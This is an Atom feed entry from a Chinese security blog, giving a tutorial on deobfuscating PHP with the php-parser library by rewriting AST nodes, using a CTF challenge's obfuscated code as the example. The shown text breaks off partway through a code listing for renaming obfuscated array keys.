<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J0k3r&#39;s Blog</title>
  
  <subtitle>Stay Hungry Stay Foolish</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://j0k3r.top/"/>
  <updated>2020-03-26T10:19:05.262Z</updated>
  <id>http://j0k3r.top/</id>
  
  <author>
    <name>J0k3r</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基于 AST（抽象语法树）解 PHP 混淆</title>
    <link href="http://j0k3r.top/2020/03/24/php-Deobfuscator/"/>
    <id>http://j0k3r.top/2020/03/24/php-Deobfuscator/</id>
    <published>2020-03-23T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:05.262Z</updated>
    
    <content type="html"><![CDATA[<p>以前段时间 XCTF 抗疫赛中的 hardphp 为例，该题目最终只有一只战队解出，题目作者 zsx 也在随后的文章中点了下解混淆的思路，不过在各 writeup 中没有找到有关解混淆的完整的代码，于是学习一下通过修改 AST 节点解混淆的方法</p><a id="more"></a><h2 id="0x01-php-parser"><a href="#0x01-php-parser" class="headerlink" title="0x01 php-parser"></a>0x01 php-parser</h2><p>php-parser 是一个 PHP 库，可以将 PHP 5 或 PHP 7 代码解析为抽象语法树（AST）</p><p><a href="https://github.com/nikic/php-parser/releases" target="_blank" rel="noopener">https://github.com/nikic/php-parser/releases</a></p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require nikic/php-parser</span><br></pre></td></tr></table></figure><p>安装好之后就可以直接引用了， <code>require dirname(__FILE__).&#39;/vendor/autoload.php&#39;;</code> </p><p>官方文档中有说 XDebug 容易使 php-parser 的运行速度慢五倍以上，最好还是禁用吧</p><p>解析代码时首先创建一个解析器 ( parser instance )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>使用 PREFER_PHP7 优先解析 PHP7 代码</p><p>使用 ParserFactory 的 parse 方法解析代码，得到一个 statement 节点数组，语法错误可以通过 <code>PhpParser\Error</code> 来捕获</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">$code = <span class="string">&lt;&lt;&lt;'CODE'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo 'Hello PHP';</span></span><br><span class="line"><span class="string">CODE;</span></span><br><span class="line"></span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $stmts = $parser-&gt;parse($code);</span><br><span class="line">    var_dump($stmts);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Parse Error: '</span>, $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 statement 节点数组如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  object(PhpParser\Node\Stmt\Echo_)<span class="comment">#1100 (2) &#123;</span></span><br><span class="line">    [<span class="string">"exprs"</span>]=&gt;</span><br><span class="line">    <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      [<span class="number">0</span>]=&gt;</span><br><span class="line">      object(PhpParser\Node\Scalar\String_)<span class="comment">#1099 (2) &#123;</span></span><br><span class="line">        [<span class="string">"value"</span>]=&gt;</span><br><span class="line">        string(<span class="number">9</span>) <span class="string">"Hello PHP"</span></span><br><span class="line">        [<span class="string">"attributes"</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">          [<span class="string">"startLine"</span>]=&gt;</span><br><span class="line">          int(<span class="number">3</span>)</span><br><span class="line">          [<span class="string">"endLine"</span>]=&gt;</span><br><span class="line">          int(<span class="number">3</span>)</span><br><span class="line">          [<span class="string">"kind"</span>]=&gt;</span><br><span class="line">          int(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="string">"attributes"</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">    <span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">      [<span class="string">"startLine"</span>]=&gt;</span><br><span class="line">      int(<span class="number">3</span>)</span><br><span class="line">      [<span class="string">"endLine"</span>]=&gt;</span><br><span class="line">      int(<span class="number">3</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 NodeDumper 跟直观得查看 AST </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line">$nodeDumper = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> $nodeDumper-&gt;dump($stmts), <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span>: Stmt_Echo(</span><br><span class="line">        exprs: <span class="keyword">array</span>(</span><br><span class="line">            <span class="number">0</span>: Scalar_String(</span><br><span class="line">                value: Hello PHP</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>通过 AST 可以方便查看或者修改代码中的某些值，比如通过 <code>($stmts[0]-&gt;exprs)[0]-&gt;value = &#39;Hello Word&#39;;</code>即可修改 Hello PHP 为  Hello Word。但是这是在代码结构已知的情况下做的修改，效率并不高，php-parser 提供了一种用于遍历和访问节点树的组件 <code>PhpParser\NodeTraverser</code></p><p>例如下面代码就可以将原本代码中的 <code>echo &#39;Hello PHP&#39;;</code> 换成 <code>print &#39;Hello Word&#39;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeTraverser</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Node</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeVisitorAbstract</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$code = <span class="string">&lt;&lt;&lt;'CODE'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo 'Hello PHP';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CODE;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNodeVisitor</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Scalar\String_) &#123;</span><br><span class="line">            $node-&gt;value = <span class="string">'Hello Word'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintNodeVisitor</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Stmt\Echo_) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> PhpParser\Node\Stmt\Expression( <span class="keyword">new</span> Node\Expr\Print_(<span class="keyword">new</span> Node\Scalar\String_(($node-&gt;exprs)[<span class="number">0</span>]-&gt;value)) );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $stmts = $parser-&gt;parse($code);</span><br><span class="line">    $traverser = <span class="keyword">new</span> NodeTraverser;</span><br><span class="line">    <span class="comment">// 添加 node visitors</span></span><br><span class="line">    $traverser-&gt;addVisitor(<span class="keyword">new</span> MyNodeVisitor);</span><br><span class="line">    $traverser-&gt;addVisitor(<span class="keyword">new</span> PrintNodeVisitor);</span><br><span class="line">    <span class="comment">// 遍历 AST</span></span><br><span class="line">    $new_stmts = $traverser-&gt;traverse($stmts);</span><br><span class="line">    <span class="comment">// 将 AST 转为 PHP 代码</span></span><br><span class="line">    $prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">    $new_code = $prettyPrinter-&gt;prettyPrintFile($new_stmts);</span><br><span class="line">    <span class="keyword">echo</span> $code.PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--After parser:--\n\n"</span>.$new_code;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Parse Error: '</span>, $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200321215310182.png" alt></p><h2 id="0x02-解混淆-（Deobfuscate）"><a href="#0x02-解混淆-（Deobfuscate）" class="headerlink" title="0x02 解混淆 （Deobfuscate）"></a>0x02 解混淆 （Deobfuscate）</h2><p>熟悉 php-parser 对 AST 节点的操作就可以解混淆了</p><p>比如这个 index.php，可以看出混淆后的基本代码格式为</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-Deobfuscator.assets/image-20200324013546190.png" alt></p><p>unserialize + base64_decode 的方式赋值给 GLOBALS 数组，后面全都是基于 GLOBALS 数组的取值、运算和嵌套操作</p><p>思路也很简单，就是首先获取  <code>$GLOBALS = unserialize(base64_decode(&quot;xxxx&quot;))</code> 模式的 PHP 代码得到的变量（数组），后面在发现调用该数组值时进行替换，然后运算表达式，将得到的字符串进行拼接，换一下变量名。</p><h3 id="解变量名"><a href="#解变量名" class="headerlink" title="解变量名"></a>解变量名</h3><p>通过正则判断变量名，然后替换节点为新变量名即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量重命名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reNameVar</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $varCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $varReName = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\Variable) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/'</span>, $node-&gt;name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (in_array($node-&gt;name, array_keys(<span class="keyword">$this</span>-&gt;varReName)))&#123;</span><br><span class="line">                    $new_var_name = str_replace($node-&gt;name, <span class="string">'var_'</span> . <span class="keyword">$this</span>-&gt;varReName[$node-&gt;name], $node-&gt;name);</span><br><span class="line">                    <span class="keyword">return</span> (<span class="keyword">new</span> Node\Expr\Variable($new_var_name));    </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;varReName[$node-&gt;name] = <span class="keyword">$this</span>-&gt;varCount++;</span><br><span class="line">                    $new_var_name = str_replace($node-&gt;name, <span class="string">'var_'</span> . <span class="keyword">$this</span>-&gt;varReName[$node-&gt;name], $node-&gt;name);</span><br><span class="line">                    <span class="keyword">return</span> (<span class="keyword">new</span> Node\Expr\Variable($new_var_name));    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解-unserialize-base64-decode-混淆"><a href="#解-unserialize-base64-decode-混淆" class="headerlink" title="解 unserialize + base64_decode 混淆"></a>解 unserialize + base64_decode 混淆</h3><p>在作者 zsx 的 <a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">开发简单的PHP混淆器与解混淆器</a> 这篇文章中有一个简单的 demo，不过要改下，直接拿来是不行的，后面数组的值会获取不到，因为这里有两次 unserialize + base64_decode 混淆，而且后面是   <code>(&#39;unserialize&#39;)((&#39;base64_decode&#39;)(&#39;xxx&#39;)</code>  这种代码形式，还要控制获取 GLOBALS 数组内容为 NULL 时的返回结果，所以要加这两个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayToConstant</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $_variableName = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $_constants = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">enterNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 判断 unserialize(base64_decode('xxx'))</span></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\Assign &amp;&amp;</span><br><span class="line">            $node-&gt;expr <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            is_string($node-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'unserialize'</span> &amp;&amp;</span><br><span class="line">            count($node-&gt;expr-&gt;args) === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;</span><br><span class="line">            is_string($node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;parts[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'base64_decode'</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            $string = $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value;</span><br><span class="line">            $array = unserialize(base64_decode($string));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_variableName = $node-&gt;var-&gt;name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_constants = $array;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\Assign($node-&gt;var, Node\Scalar\LNumber::fromString(<span class="string">"0"</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>( <span class="comment">// 判断 ('unserialize')(('base64_decode')('xxx') </span></span><br><span class="line">                $node <span class="keyword">instanceof</span> Node\Expr\Assign &amp;&amp;</span><br><span class="line">                $node-&gt;expr <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">                $node-&gt;expr-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">                is_string($node-&gt;expr-&gt;name-&gt;value) &amp;&amp;</span><br><span class="line">                $node-&gt;expr-&gt;name-&gt;value == <span class="string">'unserialize'</span> &amp;&amp;</span><br><span class="line">                count($node-&gt;expr-&gt;args) === <span class="number">1</span> &amp;&amp;</span><br><span class="line">                $node-&gt;expr-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">                $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp;</span><br><span class="line">                $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">                is_string($node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;value) &amp;&amp; </span><br><span class="line">                $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name-&gt;value == <span class="string">'base64_decode'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $string = $node-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value;</span><br><span class="line">                    $array = unserialize(base64_decode($string));</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_variableName = $node-&gt;var-&gt;name;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_constants = $array;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\Assign($node-&gt;var, Node\Scalar\LNumber::fromString(<span class="string">"0"</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_variableName === <span class="string">''</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            $node <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch &amp;&amp;</span><br><span class="line">            $node-&gt;var-&gt;name === <span class="keyword">$this</span>-&gt;_variableName</span><br><span class="line">        ) &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_constants[$node-&gt;dim-&gt;value];</span><br><span class="line">            <span class="keyword">if</span> ($val === <span class="keyword">null</span>)&#123;  <span class="comment">// 判断该 GLOBALS 值是否存在</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_string($val)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\String_($val);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_double($val)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\DNumber($val);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_int($val)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\LNumber($val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\ConstFetch(<span class="keyword">new</span> Node\Name\FullyQualified(json_encode($val)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解-GLOBALS-键名混淆"><a href="#解-GLOBALS-键名混淆" class="headerlink" title="解 GLOBALS 键名混淆"></a>解 GLOBALS 键名混淆</h3><p>这个其实不是很必要，对逻辑没啥影响，不过看起来会工整些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GLOBALS 键值重命名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reNameArr</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计数</span></span><br><span class="line">    <span class="keyword">private</span> $arrCount = [];</span><br><span class="line">    <span class="comment">// 替换数组</span></span><br><span class="line">    <span class="keyword">private</span> $arrReName = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $node <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch &amp;&amp; !($node-&gt;var <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch) &amp;&amp; !($node-&gt;dim <span class="keyword">instanceof</span> Node\Expr\ArrayDimFetch) ) &#123;</span><br><span class="line">            $key = $node-&gt;dim-&gt;value;</span><br><span class="line">            $arrName = $node-&gt;var-&gt;name;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/'</span>, $key)) &#123;</span><br><span class="line">                <span class="comment">// 计数数组有改数组名记录</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;arrCount[$arrName] !== <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="comment">// 判断该数组当前键值</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;arrReName[$arrName][$key]  !== <span class="keyword">null</span>)&#123;</span><br><span class="line">                        $new_key_name = str_replace($key, <span class="string">'key_'</span> . <span class="keyword">$this</span>-&gt;arrReName[$arrName][$key], $key);</span><br><span class="line">                        